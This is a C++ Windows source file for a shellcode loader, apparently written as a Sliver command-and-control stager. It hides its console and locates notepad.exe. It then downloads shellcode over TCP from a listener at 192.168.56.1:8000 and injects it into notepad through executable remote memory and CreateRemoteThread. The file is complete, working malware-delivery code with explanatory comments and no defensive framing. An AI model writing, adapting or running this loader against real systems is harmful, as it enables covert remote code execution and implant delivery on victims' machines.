#define WIN32_LEAN_AND_MEAN // excludes older winsock.h, preventing header clashes with winsock2.h
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")  // ensures linker links the Winsock 2 library needed for sockets

struct Shellcode {
    BYTE* pcData; // pointer to raw shellcode
    DWORD dwSize; // length of shellcode
};

// function declarations
DWORD GetTargetPID(const wchar_t* procName); // find process ID by name
BOOL DownloadShellcodeViaTCP(const char* host, int port, Shellcode* shellcode); // download shellcode from Sliver server
BOOL Inject(DWORD dwPID, Shellcode shellcode); // inject and execute shellcode in remote process

int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console

    DWORD pid = GetTargetPID(L"notepad.exe"); // find PID of notepad.exe
    if (!pid) {
        std::cout << "Target process not found." << std::endl;
        return 1; // exit if process is not running.
    }

    std::cout << "Connecting to Sliver server." << std::endl;
    Shellcode shellcode; // download shellcode over tcp from stager listener
    if (!DownloadShellcodeViaTCP("192.168.56.1", 8000, &shellcode)) {
        std::cout << "Failed to download shellcode." << std::endl;
        return 2;
    }

    std::cout << "Downloaded shellcode size: " << shellcode.dwSize << " bytes" << std::endl;

    std::cout << "Injecting into PID." << std::endl;
    if (!Inject(pid, shellcode)) { // inject and run shellcoed into process
        std::cout << "Injection failed." << std::endl;
        return 3;
    }

    std::cout << "Shellcode injected successfully." << std::endl;
    return 0;
}

// finding target process
DWORD GetTargetPID(const wchar_t* procName) {
    PROCESSENTRY32 entry; // structure that holds info about a process
    entry.dwSize = sizeof(PROCESSENTRY32); // establish size of 'entry' struct

    // CreateToolhelp32Snapshot creates list of all processes
    // variable 'snapshot' acts at sort of a pointer to the process list
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // TH32CS_SNAPPROCESS gets all running processes
    if (Process32First(snapshot, &entry)) { // fills entry with first process in snapshot, true if successful
        do {
            if (!_wcsicmp(entry.szExeFile, procName)) { // string comparison to find the file we're looking for
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry)); // keeps looping through each process in snapshot
    }
    CloseHandle(snapshot);
    return 0;
}

BOOL DownloadShellcodeViaTCP(const char* host, int port, Shellcode* shellcode) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return FALSE; // initiate Winsock API

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // create TCP socket
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }
    std::cout << "socket created" << std::endl;
    // sets up the server's address structure
    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, host, &server.sin_addr);

    std::cout << "connecting.." << std::endl;
    // connects to the listener on the given IP and port
    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cout << "Connect failed: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    std::cout << "connected" << std::endl;

    int timeout = 5000; // timeout in milliseconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    // allocate buffer and set initial size
    DWORD capacity = 4096;
    BYTE* buffer = (BYTE*)malloc(capacity);
    DWORD totalSize = 0;

    // read incoming shellcode until server closes connection
    // grow buffer as needed
    while (true) {
        int bytesRead = recv(sock, (char*)(buffer + totalSize), capacity - totalSize, 0);
        if (bytesRead <= 0) break;
        totalSize += bytesRead;
        if (capacity - totalSize < 1024) {
            capacity *= 2;
            buffer = (BYTE*)realloc(buffer, capacity);
        }
        std::cout << "totalSize: " << totalSize << std::endl;
    }
    std::cout << "after loop" << std::endl;

    // shut down socket and WS2
    closesocket(sock);
    WSACleanup();

    // store shellcode pointer and size in Shellcode struct established above.
    shellcode->pcData = buffer;
    shellcode->dwSize = totalSize;
    return TRUE;
}

BOOL Inject(DWORD dwPID, Shellcode shellcode) {

    // open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 
    if (!hProcess) return FALSE;

    std::cout << "opened process" << std::endl;

    // allocates memory in the target process with execute permissions
    LPVOID remoteMemory = VirtualAllocEx(hProcess, nullptr, shellcode.dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        CloseHandle(hProcess);
        return FALSE;
    }

    std::cout << "allocated memory" << std::endl;

    // writes the downloaded shellcode into the remote memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode.pcData, shellcode.dwSize, &bytesWritten)) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    std::cout << "finished writing shellcode to memory" << std::endl;

    // execute shellcode by creating a new thread in the target process
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMemory, nullptr, 0, nullptr);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    std::cout << "created new thread" << std::endl;

    std::cout << "waiting for remote thread to complete" << std::endl;
    WaitForSingleObject(hThread, 1000); // wait for remote thread (Shellcode) to complete
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    std::cout << "Remote thread exited with code: " << exitCode << std::endl;
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}
